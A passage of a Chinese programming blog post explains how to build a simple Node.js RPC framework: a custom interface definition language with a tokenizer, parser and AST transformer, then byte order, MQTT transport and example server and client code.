Call，远程过程调用)。<code>RPC</code>其实就是一台电脑上的进程调用另外一台电脑上的进程的工具。成熟的<code>RPC</code>方案大多数会具备服务注册、服务发现、熔断降级和限流等机制。目前市面上的RPC已经有很多成熟的了，比如<code>Facebook</code>家的<code>Thrift</code>、<code>Google</code>家的<code>gRPC</code>、阿里家的<code>Dubbo</code>和蚂蚁家的<code>SOFA</code>。</p>\n<h4>接口定义语言</h4>\n<p>接口定义语言，简称<code>IDL,</code>是实现端对端之间可靠通讯的一套编码方案。这里有涉及到传输数据的序列化和反序列化，我们常用的http的请求一般用json当做序列化工具，定制<code>rpc</code>协议的时候因为要求响应迅速等特点，所以大多数会定义一套序列化协议。比如：</p>\n<p><code>Protobuf</code>：</p>\n<pre class=\"prettyprint language- protobuf\"><code>&#x2F;&#x2F; protobuf 版本\nsyntax = &quot;proto3&quot;;\n \npackage testPackage;\n \nservice testService {\n  &#x2F;&#x2F; 定义一个ping方法，请求参数集合pingRequest, 响应参数集合pingReply \n  rpc ping (pingRequest) returns (pingReply) {}\n}\n \nmessage pingRequest {\n  &#x2F;&#x2F; string 是类型，param是参数名，1是指参数在方法的第1个位置\n  string param = 1;\n}\n \nmessage pingReply {\n  string message = 1;\n  string content = 2;\n}\n</code></pre><p>讲到<code>Protobuf</code>就得讲到该库作者的另一个作品<code>Cap'n proto</code>了，号称性能是直接秒杀<code>Google Protobuf</code>，直接上官方对比：</p>\n<p><img src=\"https://capnproto.org/images/infinity-times-faster.png\" alt=\"Cap'n proto\"></p>\n<p>虽然知道很多比<code>Protobuf</code>更快的编码方案，但是快到这种地步也是厉害了，为啥这么快，Cap’n Proto的文档里面就立刻说明了，因为<code>Cap'n Proto</code>没有任何序列号和反序列化步骤，<code>Cap'n Proto</code>编码的数据格式跟在内存里面的布局是一致的，所以可以直接将编码好的structure直接字节存放到硬盘上面。贴个栗子：</p>\n<pre class=\"prettyprint language- shell\"><code>@0xdbb9ad1f14bf0b36;  # unique file ID, generated by &#96;capnp id&#96;\n\nstruct Person {\n  name @0 :Text;\n  birthdate @3 :Date;\n\n  email @1 :Text;\n  phones @2 :List(PhoneNumber);\n\n  struct PhoneNumber {\n    number @0 :Text;\n    type @1 :Type;\n\n    enum Type {\n      mobile @0;\n      home @1;\n      work @2;\n    }\n  }\n}\n\nstruct Date {\n  year @0 :Int16;\n  month @1 :UInt8;\n  day @2 :UInt8;\n}\n</code></pre><p>我们这里要定制的编码方案就是基于<code>protobuf</code>和<code>Cap'n Proto</code>结合的类似的语法。因为本人比较喜欢刀剑神域里的男主角，所以就给这个库起了个名字    —— <code>Kiritobuf</code>。</p>\n<p>首先我们定义<code>kirito</code>的语法：</p>\n<pre class=\"prettyprint language-bash\"><code># test\n\nservice testService {\n  method ping (reqMsg, resMsg)\n}\n\nstruct reqMsg {\n  @0 age = Int16;\n  @1 name = Text;\n}\n\nstruct resMsg {\n  @0 age = Int16;\n  @1 name = Text;\n}\n</code></pre><ul>\n<li><code>#</code> 开头的是注释</li>\n<li>保留关键字, <code>service</code>、<code>method</code>、<code>struct</code>,</li>\n<li><code>{}</code>里是一个块结构</li>\n<li><code>()</code>里有两个参数，第一个是请求的参数结构，第二个是返回值的结构</li>\n<li><code>@</code>是定义参数位置的描述符，<code>0</code>表示在首位</li>\n<li><code>=</code>号左边是参数名，右边是参数类型</li>\n</ul>\n<p>参数类型：</p>\n<ul>\n<li><strong>Boolean:</strong> <code>Bool</code></li>\n<li><strong>Integers:</strong> <code>Int8</code>, <code>Int16</code>, <code>Int32</code>, <code>Int64</code></li>\n<li><strong>Unsigned integers:</strong> <code>UInt8</code>, <code>UInt16</code>, <code>UInt32</code>, <code>UInt64</code></li>\n<li><strong>Floating-point:</strong> <code>Float32</code>, <code>Float64</code></li>\n<li><strong>Blobs:</strong> <code>Text</code>, <code>Data</code></li>\n<li><strong>Lists:</strong> <code>List(T)</code></li>\n</ul>\n<p>定义好了语法和参数类型，我们先过一下生成有抽象关系代码的流程：</p>\n<p><img src=\"https://raw.githubusercontent.com/rickyes/rickyes.github.io/master/image/kirito.jpg\" alt=\"ast\"></p>\n<p>取到<code>.kirito</code>后缀的文件，读取全部字符，通过词法分析器生成<code>token</code>，得到的<code>token</code>传入语法分析器生成<code>AST (抽象语法树)</code>。</p>\n<p>首先我们新建一个<code>kirito.js</code>文件:</p>\n<pre class=\"prettyprint language-javascript\"><code>&#x27;use strict&#x27;;\n\nconst fs = require(&#x27;fs&#x27;);\nconst tokenizer = Symbol.for(&#x27;kirito#tokenizer&#x27;);\nconst parser = Symbol.for(&#x27;kirito#parser&#x27;);\nconst transformer = Symbol.for(&#x27;kirito#transformer&#x27;);\n&#x2F;&#x2F; 定义词法分析Token类型 \nconst TYPE = {\n  &#x2F;&#x2F; 保留字，service、struct、method...\n  KEYWORD: &#x27;keyword&#x27;,\n  &#x2F;&#x2F; 变量\n  VARIABLE: &#x27;variable&#x27;,\n  &#x2F;&#x2F; 符号，{ } ( ) ; # @ ,\n  SYMBOL: &#x27;symbol&#x27;,\n  &#x2F;&#x2F; 参数位置，数值表示0、1、2、3...\n  INDEX: &#x27;index&#x27;\n};\n&#x2F;&#x2F; 定义语法分析字段类型\nconst EXP = {\n  &#x2F;&#x2F; 变量\n  VARIABLE: &#x27;Identifier&#x27;,\n  &#x2F;&#x2F; 结构申明，service、struct、method\n  STRUCT_DECLARATIONL: &#x27;StructDeclaration&#x27;,\n  &#x2F;&#x2F; 变量申明，@\n  VAR_DECLARATION: &#x27;VariableDeclaration&#x27;,\n  &#x2F;&#x2F; 数据类型, Int16、UInt16、Bool、Text...\n  TYPE: &#x27;DataType&#x27;,\n};\n</code></pre><p>定义好了一些必要的字面量，接下来首先是词法分析阶段。</p>\n<h5>词法解析</h5>\n<p>我们设计词法分析得到的<code>Token</code>是这样子的：</p>\n<pre class=\"prettyprint language-shell\"><code>[ { type: &#x27;keyword&#x27;, value: &#x27;service&#x27; },\n  { type: &#x27;variable&#x27;, value: &#x27;testService&#x27; },\n  { type: &#x27;symbol&#x27;, value: &#x27;{&#x27; },\n  { type: &#x27;keyword&#x27;, value: &#x27;method&#x27; },\n  { type: &#x27;variable&#x27;, value: &#x27;ping&#x27; },\n  { type: &#x27;symbol&#x27;, value: &#x27;(&#x27; },\n  { type: &#x27;variable&#x27;, value: &#x27;reqMsg&#x27; },\n  { type: &#x27;variable&#x27;, value: &#x27;resMsg&#x27; },\n  { type: &#x27;symbol&#x27;, value: &#x27;)&#x27; },\n  { type: &#x27;symbol&#x27;, value: &#x27;}&#x27; },\n  { type: &#x27;keyword&#x27;, value: &#x27;struct&#x27; },\n  { type: &#x27;variable&#x27;, value: &#x27;reqMsg&#x27; },\n  { type: &#x27;symbol&#x27;, value: &#x27;{&#x27; },\n  { type: &#x27;symbol&#x27;, value: &#x27;@&#x27; },\n  { type: &#x27;index&#x27;, value: &#x27;1&#x27; },\n  { type: &#x27;variable&#x27;, value: &#x27;age&#x27; },\n  { type: &#x27;symbol&#x27;, value: &#x27;=&#x27; },\n  { type: &#x27;variable&#x27;, value: &#x27;Int16&#x27; },\n  { type: &#x27;symbol&#x27;, value: &#x27;;&#x27; },\n  { type: &#x27;symbol&#x27;, value: &#x27;@&#x27; },\n  { type: &#x27;index&#x27;, value: &#x27;2&#x27; },\n  { type: &#x27;variable&#x27;, value: &#x27;name&#x27; },\n  { type: &#x27;symbol&#x27;, value: &#x27;=&#x27; },\n  { type: &#x27;variable&#x27;, value: &#x27;Text&#x27; },\n  { type: &#x27;symbol&#x27;, value: &#x27;;&#x27; },\n  { type: &#x27;symbol&#x27;, value: &#x27;}&#x27; },\n  { type: &#x27;keyword&#x27;, value: &#x27;struct&#x27; },\n  { type: &#x27;variable&#x27;, value: &#x27;resMsg&#x27; },\n  { type: &#x27;symbol&#x27;, value: &#x27;{&#x27; },\n  { type: &#x27;symbol&#x27;, value: &#x27;@&#x27; },\n  { type: &#x27;index&#x27;, value: &#x27;1&#x27; },\n  { type: &#x27;variable&#x27;, value: &#x27;age&#x27; },\n  { type: &#x27;symbol&#x27;, value: &#x27;=&#x27; },\n  { type: &#x27;variable&#x27;, value: &#x27;Int16&#x27; },\n  { type: &#x27;symbol&#x27;, value: &#x27;;&#x27; },\n  { type: &#x27;symbol&#x27;, value: &#x27;@&#x27; },\n  { type: &#x27;index&#x27;, value: &#x27;2&#x27; },\n  { type: &#x27;variable&#x27;, value: &#x27;name&#x27; },\n  { type: &#x27;symbol&#x27;, value: &#x27;=&#x27; },\n  { type: &#x27;variable&#x27;, value: &#x27;Text&#x27; },\n  { type: &#x27;symbol&#x27;, value: &#x27;;&#x27; },\n  { type: &#x27;symbol&#x27;, value: &#x27;}&#x27; } ]\n</code></pre><p>词法分析步骤：</p>\n<ul>\n<li>把获取到的<code>kirito</code>代码串按照<code>\\n</code>分割组合成数组A，数组的每个元素就是一行代码</li>\n<li>遍历数组A，将每行代码逐个字符去读取</li>\n<li>在读取的过程中定义匹配规则，比如注释、保留字、变量、符号、数组等</li>\n<li>将每个匹配的字符或字符串按照对应类型添加到tokens数组中</li>\n</ul>\n<p>代码如下：</p>\n<pre class=\"prettyprint language-javascript\"><code>[tokenizer] (input) {\n    &#x2F;&#x2F; 保留关键字\n    const KEYWORD = [&#x27;service&#x27;, &#x27;struct&#x27;, &#x27;method&#x27;];\n    &#x2F;&#x2F; 符号\n    const SYMBOL = [&#x27;{&#x27;, &#x27;}&#x27;, &#x27;(&#x27;, &#x27;)&#x27;, &#x27;=&#x27;, &#x27;@&#x27;, &#x27;;&#x27;];\n    &#x2F;&#x2F; 匹配所有空字符\n    const WHITESPACE = &#x2F;\\s&#x2F;;\n    &#x2F;&#x2F; 匹配所有a-z的字符、不限大小写\n    const LETTERS = &#x2F;^[a-z]$&#x2F;i;\n    &#x2F;&#x2F; 匹配数值\n    const NUMBER = &#x2F;\\d&#x2F;;\n    \n    &#x2F;&#x2F; 以换行符分割成数组\n    const source = input.split(&#x27;\\n&#x27;);\n    &#x2F;&#x2F; 最终生成的token数组\n    const tokens = [];\n    source.some(line =&gt; {\n      &#x2F;&#x2F; 声明一个 &#96;current&#96; 变量作为指针\n      let current = 0;\n      &#x2F;&#x2F; 是否继续当前循环、移动到下一行，用于忽略注释\n      let isContinue = false;\n      while (current &lt; line.length) {\n        let char = line[current];\n\n        &#x2F;&#x2F; 匹配任何空字符\n        if (WHITESPACE.test(char)) {\n          current++;\n          continue;\n        }\n\n        &#x2F;&#x2F; 忽略注释\n        if (char === &#x27;#&#x27;) {\n          isContinue = true;\n          break;\n        }\n\n        &#x2F;&#x2F; 匹配a-z|A-Z的字符\n        if (LETTERS.test(char)) {\n          &#x2F;&#x2F; 定义一个字符串变量，用来存储连续匹配成功的字符\n          let value = &#x27;&#x27;;\n          &#x2F;&#x2F; 匹配字符(变量&#x2F;保留字)、字符加数字(参数类型)\n          while (LETTERS.test(char) || NUMBER.test(char)) {\n            &#x2F;&#x2F; 追加字符\n            value += char;\n            &#x2F;&#x2F; 移动指针\n            char = line[++current];\n          }\n          if (KEYWORD.indexOf(value) !== -1) {\n            &#x2F;&#x2F; 匹配保留关键字\n            tokens.push({\n              type: TYPE.KEYWORD,\n              value: value\n            });\n          } else {\n            &#x2F;&#x2F; 匹配变量名、类型\n            tokens.push({\n              type: TYPE.VARIABLE,\n              value: value\n            });\n          }\n          continue;\n        }\n\n        &#x2F;&#x2F; 匹配符号 { } ( ) = @\n        if (SYMBOL.indexOf(char) !== -1) {\n          tokens.push({\n            type: TYPE.SYMBOL,\n            value: char\n          });\n          &#x2F;&#x2F; 匹配@ 参数位置符号\n          if (char === &#x27;@&#x27;) {\n            char = line[++current];\n            &#x2F;&#x2F; 匹配参数位置0-9\n            if (NUMBER.test(char)) {\n              &#x2F;&#x2F; 定义参数位置字符串，用来存储连续匹配成功的参数位置\n              let index = &#x27;&#x27;;\n              &#x2F;&#x2F; 匹配参数位置0-9\n              while (NUMBER.test(char)) {\n                &#x2F;&#x2F; 追加参数位置 &#96;1&#96;+&#96;2&#96;=&#96;12&#96;\n                index += char;\n                char = line[++current];\n              }\n              tokens.push({\n                type: TYPE.INDEX,\n                value: index\n              });\n            }\n            continue;\n          }\n          current++;\n          continue;\n        }\n        current++;\n      }\n        \n      &#x2F;&#x2F; 跳过注释\n      if (isContinue) return false;\n    });\n    return tokens;\n  }\n</code></pre><h5>语法分析</h5>\n<p>得到上面的词法分析的token后，我们就可以对该token做语法分析，我们需要最终生成的AST的格式如下：</p>\n<pre class=\"prettyprint language-json\"><code>{\n  &quot;type&quot;: &quot;Program&quot;,\n  &quot;body&quot;: [\n    {\n      &quot;type&quot;: &quot;StructDeclaration&quot;,\n      &quot;name&quot;: &quot;service&quot;,\n      &quot;value&quot;: &quot;testService&quot;,\n      &quot;params&quot;: [\n        {\n          &quot;type&quot;: &quot;StructDeclaration&quot;,\n          &quot;name&quot;: &quot;method&quot;,\n          &quot;value&quot;: &quot;ping&quot;,\n          &quot;params&quot;: [\n            {\n              &quot;type&quot;: &quot;Identifier&quot;,\n              &quot;value&quot;: &quot;reqMsg&quot;\n            },\n            {\n              &quot;type&quot;: &quot;Identifier&quot;,\n              &quot;value&quot;: &quot;resMsg&quot;\n            }\n          ]\n        }\n      ]\n    },\n    {\n      &quot;type&quot;: &quot;StructDeclaration&quot;,\n      &quot;name&quot;: &quot;struct&quot;,\n      &quot;value&quot;: &quot;reqMsg&quot;,\n      &quot;params&quot;: [\n        {\n          &quot;type&quot;: &quot;VariableDeclaration&quot;,\n          &quot;name&quot;: &quot;@&quot;,\n          &quot;value&quot;: &quot;1&quot;,\n          &quot;params&quot;: [\n            {\n              &quot;type&quot;: &quot;Identifier&quot;,\n              &quot;value&quot;: &quot;age&quot;\n            },\n            {\n              &quot;type&quot;: &quot;DataType&quot;,\n              &quot;value&quot;: &quot;Int16&quot;\n            }\n          ]\n        },\n        {\n          &quot;type&quot;: &quot;VariableDeclaration&quot;,\n          &quot;name&quot;: &quot;@&quot;,\n          &quot;value&quot;: &quot;2&quot;,\n          &quot;params&quot;: [\n            {\n              &quot;type&quot;: &quot;Identifier&quot;,\n              &quot;value&quot;: &quot;name&quot;\n            },\n            {\n              &quot;type&quot;: &quot;DataType&quot;,\n              &quot;value&quot;: &quot;Text&quot;\n            }\n          ]\n        }\n      ]\n    },\n    {\n      &quot;type&quot;: &quot;StructDeclaration&quot;,\n      &quot;name&quot;: &quot;struct&quot;,\n      &quot;value&quot;: &quot;resMsg&quot;,\n      &quot;params&quot;: [\n        {\n          &quot;type&quot;: &quot;VariableDeclaration&quot;,\n          &quot;name&quot;: &quot;@&quot;,\n          &quot;value&quot;: &quot;1&quot;,\n          &quot;params&quot;: [\n            {\n              &quot;type&quot;: &quot;Identifier&quot;,\n              &quot;value&quot;: &quot;age&quot;\n            },\n            {\n              &quot;type&quot;: &quot;DataType&quot;,\n              &quot;value&quot;: &quot;Int16&quot;\n            }\n          ]\n        },\n        {\n          &quot;type&quot;: &quot;VariableDeclaration&quot;,\n          &quot;name&quot;: &quot;@&quot;,\n          &quot;value&quot;: &quot;2&quot;,\n          &quot;params&quot;: [\n            {\n              &quot;type&quot;: &quot;Identifier&quot;,\n              &quot;value&quot;: &quot;name&quot;\n            },\n            {\n              &quot;type&quot;: &quot;DataType&quot;,\n              &quot;value&quot;: &quot;Text&quot;\n            }\n          ]\n        }\n      ]\n    }\n  ]\n}\n</code></pre><p>看上图我们能友好的得到结构、参数、数据类型、函数之间的依赖和关系，步骤：</p>\n<ul>\n<li>遍历词法分析得到的token数组，通过调用分析函数提取token之间的依赖节点</li>\n<li>分析函数内部定义token提取规则，比如：\n<ol>\n<li>服务保留字  服务名  { 函数保留字 函数名 ( 入参，返回参数 ) }</li>\n<li>参数结构保留字 结构名 { 参数位置 参数名 参数数据类型 }</li>\n</ol>\n</li>\n<li>递归调用分析函数提取对应节点依赖关系，将节点添加到AST中</li>\n</ul>\n<p>代码如下：</p>\n<pre class=\"prettyprint language-js\"><code>[parser] (tokens) {\n    &#x2F;&#x2F; 声明ast对象，作为分析过程中的节点存储器\n    const ast = {\n      type: &#x27;Program&#x27;,\n      body: []\n    };\n    &#x2F;&#x2F; 定义token数组指针变量\n    let current = 0;\n    \n    &#x2F;&#x2F; 定义函数、用例递归分析节点之间的依赖和存储\n    function walk() {\n      &#x2F;&#x2F; 当前指针位置的token节点\n      let token = tokens[current];\n\n      &#x2F;&#x2F; 检查变量、数据类型\n      if (token.type === TYPE.VARIABLE) {\n        current++;\n        return {\n          type: EXP.VARIABLE,\n          struct: tokens[current].value === &#x27;=&#x27; ? false : true,\n          value: token.value\n        };\n      }\n\n      &#x2F;&#x2F; 检查符号\n      if (token.type === TYPE.SYMBOL) {\n        &#x2F;&#x2F; 检查@，添加参数位置绑定\n        if (token.value === &#x27;@&#x27;) {\n          &#x2F;&#x2F; 移动到下一个token, 通常是个数值，也就是参数位置\n          token = tokens[++current];\n          &#x2F;&#x2F; 定义参数节点，用来存储位置、变量名、数据类型\n          let node = {\n            type: EXP.VAR_DECLARATION,\n            name: &#x27;@&#x27;,\n            value: token.value,\n            params: []\n          };\n            \n          &#x2F;&#x2F; 移动到下一个token, 准备开始读取参数变量名和数据类型\n          token = tokens[++current];\n          &#x2F;&#x2F; 每个参数节点以;符号结束\n          &#x2F;&#x2F; 这个循环中会匹配参数变量名和参数数据类型并把他们添加到当前的参数节点上\n          while (token.value !== &#x27;;&#x27;) {\n            &#x2F;&#x2F; 递归匹配参数变量名、数据类型\n            node.params.push(walk());\n            &#x2F;&#x2F; 指定当前指针的token\n            token = tokens[current];\n          }\n          &#x2F;&#x2F; 移动token数组指针\n          current++;\n          &#x2F;&#x2F; 返回参数节点\n          return node;\n        }\n\n        &#x2F;&#x2F; 检查=，匹配该符号右边的参数数据类型\n        if (token.value === &#x27;=&#x27;) {\n          &#x2F;&#x2F; 移动到下一个token\n          token = tokens[++current];\n          current++;\n          return {\n            type: EXP.TYPE,\n            value: token.value\n          };\n        }\n\n        current++;\n      }\n\n      &#x2F;&#x2F; 检查保留字\n      if (token.type === TYPE.KEYWORD) {\n        &#x2F;&#x2F; 检查service、struct\n        if ([&#x27;struct&#x27;, &#x27;service&#x27;].indexOf(token.value) !== -1) {\n          &#x2F;&#x2F; 缓存保留字\n          let keywordName = token.value;\n          &#x2F;&#x2F; 移动到下一个token，通常是结构名\n          token = tokens[++current];\n          &#x2F;&#x2F; 定义结构节点，用来储存结构保留字、结构名、结构参数数组\n          let node = {\n            type: EXP.STRUCT_DECLARATIONL,\n            &#x2F;&#x2F; 保留字\n            name: keywordName,\n            &#x2F;&#x2F; 结构名\n            value: token.value,\n            &#x2F;&#x2F; 参数数组\n            params: []\n          };\n\n          &#x2F;&#x2F; 移动到下一个token\n          token = tokens[++current];\n          &#x2F;&#x2F; 匹配符号且是{,准备解析{里的参数\n          if (token.type === TYPE.SYMBOL &amp;&amp; token.value === &#x27;{&#x27;) {\n            &#x2F;&#x2F; 移动到下一个token\n            token = tokens[++current];\n            &#x2F;&#x2F; 等于}是退出参数匹配，完成参数储存\n            while (token.value !== &#x27;}&#x27;) {\n              &#x2F;&#x2F; 递归调用分析函数，获取参数数组\n              node.params.push(walk());\n              &#x2F;&#x2F; 移动token到当前指针\n              token = tokens[current];\n            }\n            current++;\n          }\n          &#x2F;&#x2F; 返回结构节点\n          return node;\n        }\n\n        if (token.value === &#x27;method&#x27;) {\n          &#x2F;&#x2F; 检查method，匹配请求函数名\n          token = tokens[++current];\n          &#x2F;&#x2F; 定义请求函数节点，用来储存函数入参和返回参数\n          let node = {\n            type: EXP.STRUCT_DECLARATIONL,\n            name: &#x27;method&#x27;,\n            value: token.value,\n            params: []\n          };\n            \n          &#x2F;&#x2F; 移动到下一个token\n          token = tokens[++current];\n          &#x2F;&#x2F; 匹配(符号,准备储存入参和返回参数\n          if (token.type === TYPE.SYMBOL &amp;&amp; token.value === &#x27;(&#x27;) {\n            &#x2F;&#x2F; 移动到入参token\n            token = tokens[++current];\n            &#x2F;&#x2F; 等于)时退出匹配，完成函数匹配\n            while (token.value !== &#x27;)&#x27;) {\n              &#x2F;&#x2F; 递归调用分析函数\n              node.params.push(walk());\n              token = tokens[current];\n            }\n            current++;\n          }\n          &#x2F;&#x2F; 返回函数节点\n          return node;\n\n        }\n      }\n      \n      &#x2F;&#x2F; 抛出未匹配到的错误\n      throw new TypeError(token.type);\n    }\n\n    &#x2F;&#x2F; 遍历token数组\n    while (current &lt; tokens.length) {\n      ast.body.push(walk());\n    }\n    \n    &#x2F;&#x2F; 返回ast\n    return ast;\n  }\n</code></pre><h5>转换器</h5>\n<p>得到了语法分析的<code>AST</code>后我们需要进一步对<code>AST</code>转换为更易操作的<code>js对象</code>。格式如下：</p>\n<pre class=\"prettyprint language-javascript\"><code>{ \n    testService: { \n        ping: {\n            [Function]\n            param: { \n                reqMsg: { \n                    age: &#x27;Int16&#x27;, \n                    name: &#x27;Text&#x27; \n                },\n                resMsg: { \n                    age: &#x27;Int16&#x27;, \n                    name: &#x27;Text&#x27; \n                } \n            }\n        } \n    } \n}\n</code></pre><p>通过上面这个格式，我们可以更容易的知道有几个<code>service</code>、<code>service</code>里有多少个函数以及函数的参数。</p>\n<p>代码如下：</p>\n<pre class=\"prettyprint language-js\"><code>&#x2F;&#x2F; 转换器\n  [transformer] (ast) {\n    &#x2F;&#x2F; 定义汇总的service\n    const services = {};\n    &#x2F;&#x2F; 定义汇总的struct，用来储存参数结构，以便最后和service合并\n    const structs = {};\n\n    &#x2F;&#x2F; 转换数组\n    function traverseArray(array, parent) {\n      &#x2F;&#x2F; 遍历数组\n      array.some((child) =&gt; {\n        &#x2F;&#x2F; 分治转换单个节点\n        traverseNode(child, parent);\n      });\n    }\n\n    function traverseNode (node, parent) {\n\n      switch (node.type) {\n      case &#x27;Program&#x27;:\n        &#x2F;&#x2F; 根节点\n        traverseArray(node.body, parent);\n        break;\n      case &#x27;StructDeclaration&#x27;:\n        &#x2F;&#x2F; 匹配service、struct、method类型节点\n        if (node.name === &#x27;service&#x27;) {\n          &#x2F;&#x2F; 定义service的父节点为对象，为了更好的添加属性\n          parent[node.value] = {};\n          &#x2F;&#x2F; 调用数组转换函数解析，并把父节点传入以便添加子节点\n          traverseArray(node.params, parent[node.value]);\n        } else if (node.name === &#x27;method&#x27;) {\n          &#x2F;&#x2F; 定义一个空函数给method节点\n          parent[node.value] = function () {};\n          &#x2F;&#x2F; 在该函数下挂载一个param属性作为函数的参数列表\n          parent[node.value].param = {};\n          traverseArray(node.params, parent[node.value].param);\n        } else if (node.name === &#x27;struct&#x27;) {\n          &#x2F;&#x2F; 定义struct的父节点为一个对象\n          structs[node.value] = {};\n          &#x2F;&#x2F; 解析struct\n          traverseArray(node.params, structs[node.value]);\n        }\n        break;\n      case &#x27;Identifier&#x27;:\n        &#x2F;&#x2F; 定义参数变量\n        parent[node.value] = {};\n        break;\n      case &#x27;VariableDeclaration&#x27;:\n        &#x2F;&#x2F; 解析参数数组\n        traverseArray(node.params, parent);\n        break;\n      case &#x27;DataType&#x27;:\n        &#x2F;&#x2F; 参数数据类型\n        parent[Object.keys(parent).pop()] = node.value;\n        break;\n      default:\n        &#x2F;&#x2F; 抛出未匹配到的错误\n        throw new TypeError(node.type);\n      }\n    }\n\n    traverseNode(ast, services);\n      \n    &#x2F;&#x2F; 合并service和struct\n    const serviceKeys = Object.getOwnPropertyNames(services);\n    serviceKeys.some(service =&gt; {\n      const methodKeys = Object.getOwnPropertyNames(services[service]);\n      methodKeys.some(method =&gt; {\n        Object.keys(services[service][method].param).some(p =&gt; {\n          if (structs[p] !== null) {\n            services[service][method].param[p] = structs[p];\n            delete structs[p];\n          }\n        });\n      });\n    });\n\n    return services;\n  }\n</code></pre><h4>传输协议</h4>\n<p><code>RPC</code>协议有多种，可以是<code>json、xml、http2</code>，相对于http1.x这种文本协议，http2.0这种二进制协议更适合作为<code>RPC</code>的应用层通信协议。很多成熟的<code>RPC</code>框架一般都会定制自己的协议已满足各种变化莫测的需求。</p>\n<p>比如<code>Thrift</code>的<code>TBinaryProtocol</code>、<code>TCompactProtocol</code>等，用户可以自主选择适合自己的传输协议。</p>\n<p>大多数计算机都是以字节编址的（除了按字节编址还有按字编址和按位编址），我们这里只讨论字节编址。每个机器因为不同的系统或者不同的CPU对内存地址的编码有不一样的规则，一般分为两种字节序：大端序和小端序。</p>\n<blockquote>\n<p>大端序: 数据的高字节保存在低地址</p>\n</blockquote>\n<blockquote>\n<p>小端序: 数据的低字节保存在高地址</p>\n</blockquote>\n<p>举个栗子：</p>\n<p>比如一个整数：<code>258</code>，用16进制表示为<code>0x0102</code>，我们把它分为两个字节<code>0x01</code>和<code>ox02</code>，对应的二进制为<code>0000 0001</code>和<code>0000 0010</code>。在大端序的电脑上存放形式如下：</p>\n<p><img src=\"https://raw.githubusercontent.com/rickyes/rickyes.github.io/master/image/big.jpg\" alt=\"big\"></p>\n<p>小端序则相反。为了保证在不同机器之间传输的数据是一样的，开发一个通讯协议时会首先约定好使用一种作为通讯方案。<code>java虚拟机</code>采用的是大端序。在机器上我们称为<code>主机字节序</code>，网络传输时我们称为<code>网络字节序</code>。网络字节序是<code>TCP/IP</code>中规定好的一种数据表示格式，它与具体的<code>CPU</code>类型、操作系统等无关，从而可以保证数据在不同主机之间传输时能够被正确解释。网络字节序采用大端排序方式。</p>\n<p>我们这里就不造新应用层协议的轮子了，我们直接使用<code>MQTT</code>协议作为我们的默认应用层协议。<code>MQTT（Message Queuing Telemetry Transport，消息队列遥测传输协议）</code>，是一种基于<code>发布/订阅</code>（<code>publish/subscribe</code>）模式的“轻量级”通讯协议，采用大端序的网络字节序传输，该协议构建于<code>TCP/IP</code>协议上。</p>\n<h4>实现通讯</h4>\n<p>先贴下实现完的代码调用流程，首先是server端：</p>\n<pre class=\"prettyprint language-js\"><code>&#x27;use strict&#x27;;\n\nconst pRPC = require(&#x27;..&#x27;);\nconst path = require(&#x27;path&#x27;);\nconst kiritoProto = &#x27;.&#x2F;protocol&#x2F;test.kirito&#x27;;\nconst server = new pRPC.Server();\n&#x2F;&#x2F; 解析kirito文件生成js对象\nconst proto = pRPC.load(path.join(__dirname, kiritoProto));\n\n&#x2F;&#x2F; 定义client端可以调用的函数\nfunction test(call, cb) {\n  cb(null, {age: call.age, name: call.name});\n}\n\n&#x2F;&#x2F; 加载kirito解析出来的对象和函数绑定，这里声明了ping的执行函数test\nserver.addKiritoService(proto.testService, {ping: test});\n\nserver.listen(10003);\n</code></pre><p>client端：</p>\n<pre class=\"prettyprint language-js\"><code>&#x27;use strict&#x27;;\n\nconst pRPC = require(&#x27;..&#x27;);\nconst path = require(&#x27;path&#x27;);\nconst kiritoProto = &#x27;.&#x2F;protocol&#x2F;test.kirito&#x27;;\n&#x2F;&#x2F; 解析kirito文件生成js对象\nconst proto = pRPC.load(path.join(__dirname, kiritoProto));\n&#x2F;&#x2F; 分配一个client实例绑定kirito解析的对象并连接server\nconst client =  new pRPC.Client({host: &#x27;localhost&#x27;, port: 10003}, proto.testService);\n\n&#x2F;&#x2F; 调用server端的函数\nclient.ping({age: 23, name: &#x27;ricky 泽阳&#x27;}, function (err, result) {\n  if (err) {\n    throw new Error(err.message);\n  }\n  console.log(result);\n});\n</code></pre><p>无论是server端定义函数或者client端调用函数都是比较简洁的步骤。接下来我们慢慢剖析具体的逻辑实现。</p>\n<p>贴下具体的调用流程架构图：</p>\n<p><img src=\"https://raw.githubusercontent.com/rickyes/rickyes.github.io/master/image/mqt_rpc.jpg\" alt=\"rpc\"></p>\n<p>调用流程总结：</p>\n<ul>\n<li>client端解析kirito文件，绑定kirito的service到client对象</li>\n<li>server端解析kirito文件，将kiritod的service与调用函数绑定添加到server对象</li>\n<li>client端调用kirito service 里定义的函数，注册回调事件，发起MQTT请求</li>\n<li>server端接收MQTT请求，解析请求body，调用对应的函数执行完后向client端发起MQTT请求</li>\n<li>client端接收到MQTT请求后，解析body和error，并从回调事件队列里取出对应的回调函数并赋值执行</li>\n</ul>\n<p>说完了调用流程，现在开始讲解具体的实现。</p>\n<blockquote>\n<p><strong>server</strong>：</p>\n</blockquote>\n<pre class=\"prettyprint language-js\"><code>&#x2F;&#x2F; protocol&#x2F;mqtt.js\n\n&#x27;use strict&#x27;;\n\nconst net = require(&#x27;net&#x27;);\nconst debug = require(&#x27;debug&#x27;)(&#x27;polix-rpc:mqtt&#x27;);\nconst EventEmitter = require(&#x27;events&#x27;).EventEmitter;\nconst mqttCon = require(&#x27;mqtt-connection&#x27;);\n\n&#x2F;&#x2F; 定义server类，继承EventEmitter是为了更好的将模块解耦\nclass MQTT extends EventEmitter {\n\n  constructor () {\n    super();\n    &#x2F;&#x2F; 是否已经开启服务\n    this.inited = false;\n    &#x2F;&#x2F; 函数集合\n    this.events = {};\n  }\n\n  &#x2F;&#x2F; 监听端口并开启服务\n  listen (port, cb) {\n    &#x2F;&#x2F; 已经初始化了就不用再次init\n    if (this.inited) {\n      cb &amp;&amp; cb(new Error(&#x27;already inited.&#x27;, null));\n      return;\n    }\n    &#x2F;&#x2F; 赋值当前作用域上下文的指针给self对象，用来在非当前作用的函数执行当前作用域的代码\n    const self = this;\n    &#x2F;&#x2F; 设置初始化\n    this.inited = true;\n    &#x2F;&#x2F; 实例化一个net服务\n    this.server = new net.Server();\n    this.port = port || 10003;\n    &#x2F;&#x2F; 监听端口\n    this.server.listen(this.port);\n    debug(&#x27;MQTT Server is started for port: %d&#x27;, this.port);\n      \n    &#x2F;&#x2F; 监听error事件\n    this.server.on(&#x27;error&#x27;, (err) =&gt; {\n      debug(&#x27;rpc server is error: %j&#x27;, err.stack);\n      self.emit(&#x27;error&#x27;, err);\n    });\n      \n 